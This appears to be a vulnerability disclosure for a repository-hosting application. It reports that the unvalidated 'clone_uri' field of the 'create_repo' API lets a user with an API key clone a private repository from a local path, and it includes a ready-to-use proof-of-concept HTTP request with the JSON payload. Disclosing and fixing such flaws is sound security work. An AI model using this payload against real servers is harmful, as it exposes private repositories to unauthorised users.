This vulnerability allows a normal user to access the contents of repositories they do not normally have access to.

User can access any repository through clone functionality if he knows its name.

`clone_uri` inside `create_repo` API call is not properly validated so it's possible to pass local path to this parameter.

Newly created repository contains exact copy of repository that you don't have access to.

POC:

You need proper API key for this.

```
GET /_admin/api HTTP/1.1
Host: localhost:5000
Content-Length: 168
Connection: close

{"id":1,"api_key":"your_api_key","method":"create_repo","args":{"repo_name":"repo_copy","clone_uri":"C:\\kalithea\\repo_dir\\secret_repo"}}
```
